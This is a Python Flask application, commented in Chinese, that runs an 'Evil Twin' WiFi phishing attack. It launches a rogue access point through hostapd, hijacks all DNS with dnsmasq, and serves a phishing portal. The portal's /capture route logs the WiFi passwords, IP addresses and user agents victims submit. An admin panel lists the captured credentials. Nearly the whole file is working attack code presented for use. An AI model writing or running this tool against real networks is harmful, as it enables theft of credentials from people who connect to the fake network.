# app.py
from flask import Flask, render_template, request, jsonify, redirect
import sqlite3
import subprocess
import os
import json
from datetime import datetime

app = Flask(__name__)
DB_PATH = 'evil_twin.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ==================== 页面路由 ====================

@app.route('/')
def index():
    """管理后台首页"""
    conn = get_db()
    config = conn.execute('SELECT * FROM config WHERE id = 1').fetchone()
    password_count = conn.execute('SELECT COUNT(*) as count FROM password_logs').fetchone()['count']
    mac_count = conn.execute('SELECT COUNT(*) as count FROM mac_logs').fetchone()['count']
    conn.close()
    
    return render_template('index.html', 
                         config=config, 
                         password_count=password_count,
                         mac_count=mac_count)

@app.route('/passwords')
def passwords_page():
    """密码记录页面"""
    conn = get_db()
    passwords = conn.execute('SELECT * FROM password_logs ORDER BY captured_at DESC').fetchall()
    conn.close()
    return render_template('passwords.html', passwords=passwords)

@app.route('/macs')
def macs_page():
    """MAC地址记录页面"""
    conn = get_db()
    macs = conn.execute('SELECT * FROM mac_logs ORDER BY captured_at DESC').fetchall()
    conn.close()
    return render_template('macs.html', macs=macs)

# ==================== API接口 ====================

@app.route('/api/config', methods=['GET', 'POST'])
def manage_config():
    """获取/更新SSID配置"""
    conn = get_db()
    
    if request.method == 'GET':
        config = conn.execute('SELECT evil_ssid, evil_channel, network_interface FROM config WHERE id = 1').fetchone()
        conn.close()
        return jsonify(dict(config))
    
    elif request.method == 'POST':
        data = request.json
        if data is None:
            return jsonify({'status': 'error', 'message': '无效的JSON数据'}), 400
        evil_ssid = data.get('evil_ssid', 'Free_WiFi')
        evil_channel = data.get('evil_channel', 6)
        network_interface = data.get('network_interface', 'wlan0')
        
        conn.execute('UPDATE config SET evil_ssid = ?, evil_channel = ?, network_interface = ? WHERE id = 1', 
                    (evil_ssid, evil_channel, network_interface))
        conn.commit()
        conn.close()
        
        # 如果热点正在运行，重启hostapd以应用新配置
        restart_hotspot()
        
        return jsonify({'status': 'success', 'message': '配置已更新'})

@app.route('/api/passwords', methods=['GET'])
def get_passwords():
    """获取所有密码记录"""
    conn = get_db()
    passwords = conn.execute('SELECT * FROM password_logs ORDER BY captured_at DESC').fetchall()
    conn.close()
    return jsonify([dict(row) for row in passwords])

@app.route('/api/passwords', methods=['DELETE'])
def clear_passwords():
    """清空所有密码记录"""
    conn = get_db()
    conn.execute('DELETE FROM password_logs')
    conn.commit()
    conn.close()
    return jsonify({'status': 'success', 'message': '已清空所有密码记录'})

@app.route('/api/macs', methods=['GET'])
def get_macs():
    """获取所有MAC记录"""
    conn = get_db()
    macs = conn.execute('SELECT * FROM mac_logs ORDER BY captured_at DESC').fetchall()
    conn.close()
    return jsonify([dict(row) for row in macs])

@app.route('/api/macs', methods=['DELETE'])
def clear_macs():
    """清空所有MAC记录"""
    conn = get_db()
    conn.execute('DELETE FROM mac_logs')
    conn.commit()
    conn.close()
    return jsonify({'status': 'success', 'message': '已清空所有MAC记录'})

@app.route('/api/status', methods=['GET'])
def get_status():
    """获取系统运行状态"""
    # 检查hostapd是否运行
    hostapd_running = subprocess.run(['pgrep', 'hostapd'], capture_output=True).returncode == 0
    dnsmasq_running = subprocess.run(['pgrep', 'dnsmasq'], capture_output=True).returncode == 0
    
    return jsonify({
        'hostapd': hostapd_running,
        'dnsmasq': dnsmasq_running,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/start', methods=['POST'])
def start_attack():
    """启动攻击"""
    result = start_evil_twin()
    return jsonify(result)

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    """停止攻击"""
    result = stop_evil_twin()
    return jsonify(result)

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    """自动扫描无线网卡口"""
    ifaces = []
    # 方法1: iw dev (最可靠)
    try:
        r = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if 'Interface' in line:
                name = line.strip().split()[-1]
                if name:
                    ifaces.append(name)
    except:
        pass
    
    # 方法2: 检查 /sys/class/net/ (iw 不可用时)
    if not ifaces:
        try:
            for entry in os.listdir('/sys/class/net/'):
                uevent = os.path.join('/sys/class/net/', entry, 'uevent')
                if os.path.exists(uevent):
                    with open(uevent) as f:
                        content = f.read()
                    if 'DEVTYPE=wlan' in content:
                        ifaces.append(entry)
        except:
            pass
    
    return jsonify(ifaces)

@app.route('/api/scan', methods=['POST'])
def scan_wifi():
    """扫描周围 WiFi 网络 — 优先 iw，失败时 fallback 到 Windows netsh"""
    conn = get_db()
    config = conn.execute('SELECT network_interface FROM config WHERE id = 1').fetchone()
    conn.close()
    iface = config['network_interface'] if config else 'wlan0'
    
    aps = []
    
    # 方法1: Linux iw scan
    try:
        r = subprocess.run(
            ['sudo', 'iw', 'dev', iface, 'scan'],
            capture_output=True, text=True, timeout=10
        )
        if r.returncode == 0:
            aps = parse_iw_scan(r.stdout)
    except:
        pass
    
    # 方法2: Windows netsh fallback (WSL 可直接调 Windows 程序)
    if not aps:
        try:
            netsh = '/mnt/c/Windows/System32/netsh.exe'
            r = subprocess.run(
                [netsh, 'wlan', 'show', 'networks', 'mode=bssid'],
                capture_output=True, text=True, timeout=15
            )
            if r.returncode == 0:
                aps = parse_netsh_output(r.stdout)
        except:
            pass
    
    if not aps:
        return jsonify({'status': 'error', 'message': '未发现任何 WiFi 网络，请检查网卡'}), 200
    
    aps.sort(key=lambda x: x['signal'], reverse=True)
    return jsonify({'status': 'success', 'results': aps, 'count': len(aps)})


def parse_iw_scan(stdout):
    """解析 iw dev scan 输出"""
    aps = []
    current = None
    for line in stdout.splitlines():
        stripped = line.strip()
        if stripped.startswith('BSS ') and '(' in stripped:
            if current and current.get('ssid'):
                aps.append(current)
            current = {
                'bssid': stripped.split()[1].split('(')[0],
                'ssid': '', 'channel': 0, 'signal': -99, 'security': 'OPEN', 'frequency': 0
            }
        elif current is None:
            continue
        if stripped.startswith('SSID:'):
            ssid = stripped[5:].strip()
            current['ssid'] = ssid if ssid else '<隐藏>'
        elif stripped.startswith('freq:'):
            freq = int(stripped.split()[1])
            current['frequency'] = freq
            current['channel'] = freq_to_channel(freq)
        elif stripped.startswith('signal:'):
            try:
                current['signal'] = float(stripped.split()[1])
            except:
                pass
        elif 'RSN:' in stripped or 'WPA:' in stripped:
            current['security'] = 'WPA'
    if current and current.get('ssid'):
        aps.append(current)
    return aps


def parse_netsh_output(stdout):
    """解析 netsh wlan show networks mode=bssid 输出"""
    aps = []
    current_ssid = ''
    current_auth = 'OPEN'
    in_block = False
    for line in stdout.splitlines():
        stripped = line.strip()
        if stripped.startswith('SSID ') and ':' in stripped:
            current_ssid = stripped.split(':', 1)[1].strip()
            in_block = True
        elif in_block and stripped.startswith('Authentication'):
            auth = stripped.split(':', 1)[1].strip()
            current_auth = auth if auth != 'Open' else 'OPEN'
        elif in_block and stripped.startswith('BSSID ') and ':' in stripped:
            bssid = stripped.split(':', 1)[1].strip()
            # 采集后续两行的 Signal 和 Channel
            # 等等，netsh 输出中 Signal 和 Channel 在 BSSID 之后的行
            pass
    # netsh 格式复杂，用简单的逐行状态机
    return parse_netsh_v2(stdout)


def parse_netsh_v2(stdout):
    """解析 netsh wlan show networks mode=bssid (v2 状态机)"""
    import re
    aps = []
    seen = set()
    ssid = ''
    auth = 'OPEN'
    for line in stdout.splitlines():
        s = line.strip()
        m_ssid = re.match(r'^SSID\s+\d+\s*:\s*(.+)', s)
        if m_ssid:
            ssid = m_ssid.group(1).strip()
        m_auth = re.match(r'^\s*Authentication\s*:\s*(.+)', s)
        if m_auth:
            a = m_auth.group(1).strip()
            auth = 'OPEN' if a.lower() == 'open' else 'WPA'
        m_bss = re.match(r'^\s*BSSID\s+\d+\s*:\s*(.+)', s)
        if m_bss:
            bssid = m_bss.group(1).strip().upper()
            signal = 0
            channel = 0
        m_sig = re.match(r'^\s*Signal\s*:\s*(\d+)%', s)
        if m_sig:
            pct = int(m_sig.group(1))
            signal = round(-100 + pct * 0.6, 1)
        m_ch = re.match(r'^\s*Channel\s*:\s*(\d+)', s)
        if m_ch:
            channel = int(m_ch.group(1))
            # 一个 BSS 完成
            if bssid and ssid and bssid not in seen:
                seen.add(bssid)
                aps.append({
                    'bssid': bssid, 'ssid': ssid or '<隐藏>',
                    'channel': channel, 'signal': signal,
                    'security': auth, 'frequency': 0
                })
    return aps


def freq_to_channel(freq):
    """频率 MHz 转信道号"""
    if 2412 <= freq <= 2484:
        return (freq - 2407) // 5
    elif 4915 <= freq <= 5825:
        return (freq - 5000) // 5
    elif freq >= 5835:
        return (freq - 5950) // 5  # 6 GHz
    return 0

# ==================== 钓鱼页面 ====================

@app.route('/portal')
def portal():
    """钓鱼页面"""
    return render_template('portal.html')

@app.route('/capture', methods=['POST'])
def capture():
    """接收密码和MAC地址"""
    password = request.form.get('password', '')
    mac = request.remote_addr
    
    # 尝试从请求头获取真实MAC地址
    if request.headers.get('X-Forwarded-For'):
        client_ip = request.headers.get('X-Forwarded-For')
    else:
        client_ip = request.remote_addr
    
    # 获取User-Agent
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    conn = get_db()
    
    # 保存密码
    conn.execute('INSERT INTO password_logs (password, bssid) VALUES (?, ?)', 
                (password, client_ip))
    
    # 保存MAC地址信息
    conn.execute('INSERT INTO mac_logs (mac_address, ip_address, user_agent) VALUES (?, ?, ?)',
                (mac, client_ip, user_agent))
    
    conn.commit()
    conn.close()
    
    print(f"[!] Captured: Password='{password}' | IP={client_ip} | UA={user_agent}")
    
    # 返回错误页面，引导用户连接真实WiFi
    return render_template('capture_error.html'), 401

# ==================== 核心攻击函数 ====================

def start_evil_twin():
    """启动Evil Twin攻击"""
    
    # 获取配置
    conn = get_db()
    config = conn.execute('SELECT evil_ssid, evil_channel, network_interface FROM config WHERE id = 1').fetchone()
    conn.close()
    
    evil_ssid = config['evil_ssid']
    evil_channel = config['evil_channel']
    iface = config['network_interface']
    
    # 1. 停止可能冲突的服务
    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
    
    # 2. 配置hostapd
    hostapd_conf = f"""
interface={iface}
driver=nl80211
ssid={evil_ssid}
hw_mode=g
channel={evil_channel}
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    with open('/tmp/hostapd.conf', 'w') as f:
        f.write(hostapd_conf)
    
    # 3. 配置dnsmasq (DNS劫持)
    dnsmasq_conf = f"""
interface={iface}
dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
server=8.8.8.8
address=/#/192.168.4.1
"""
    with open('/tmp/dnsmasq.conf', 'w') as f:
        f.write(dnsmasq_conf)
    
    # 4. 设置网卡IP
    subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.4.1/24', 'dev', iface], capture_output=True)
    subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'], capture_output=True)
    
    # 5. 启动服务
    subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'], 
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(['sudo', 'dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d'], 
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # 6. 启动Flask钓鱼服务器 (如果未运行)
    subprocess.Popen(['python3', 'app.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return {'status': 'success', 'message': f'Evil Twin "{evil_ssid}" 已启动'}

def stop_evil_twin():
    """停止Evil Twin攻击"""
    conn = get_db()
    config = conn.execute('SELECT network_interface FROM config WHERE id = 1').fetchone()
    conn.close()
    iface = config['network_interface'] if config else 'wlan0'
    
    subprocess.run(['sudo', 'pkill', 'hostapd'], capture_output=True)
    subprocess.run(['sudo', 'pkill', 'dnsmasq'], capture_output=True)
    subprocess.run(['sudo', 'ip', 'addr', 'del', '192.168.4.1/24', 'dev', iface], capture_output=True)
    return {'status': 'success', 'message': '攻击已停止'}

def restart_hotspot():
    """重启热点以应用新配置"""
    stop_evil_twin()
    start_evil_twin()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
